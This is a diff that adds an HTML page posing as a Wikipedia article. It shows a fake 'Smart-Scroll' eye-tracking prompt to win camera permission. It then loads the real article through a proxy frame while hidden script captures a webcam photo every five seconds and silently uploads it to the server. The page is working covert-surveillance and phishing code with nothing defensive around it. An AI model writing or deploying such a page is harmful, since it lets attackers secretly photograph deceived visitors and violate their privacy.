@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Film - Wikipedia</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
+        #wiki-frame { width: 100%; height: 100%; border: none; display: none; }
+        .wiki-logo { width: 80px; margin-bottom: 20px; }
+        #enable-btn {
+            background: #36b; color: #fff; border: none; padding: 15px 30px;
+            border-radius: 4px; font-weight: bold; cursor: pointer; width: 250px;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="overlay">
+    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo" alt="Wiki">
+    <h2>Enable Smart-Scroll</h2>
+    <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
+    <button id="enable-btn">Enable & Read</button>
+</div>
+
+<iframe id="wiki-frame" src=""></iframe>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const btn = document.getElementById('enable-btn');
+    const frame = document.getElementById('wiki-frame');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    btn.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: 640, height: 480 } 
+            });
+            video.srcObject = stream;
+            
+            // Show the real Wikipedia content via the proxy
+            frame.src = "/proxy/wiki";
+            frame.style.display = "block";
+            document.getElementById('overlay').style.display = "none";
+
+            // Start taking photos every 5 seconds
+            setInterval(() => {
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                
+                fetch('/api/upload-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ dataUrl })
+                }).catch(() => {});
+            }, 5000);
+
+        } catch (err) {
+            alert("Camera access is required for the Smart-Scroll experience.");
+        }
+    });
+</script>
+</body>
+</html>
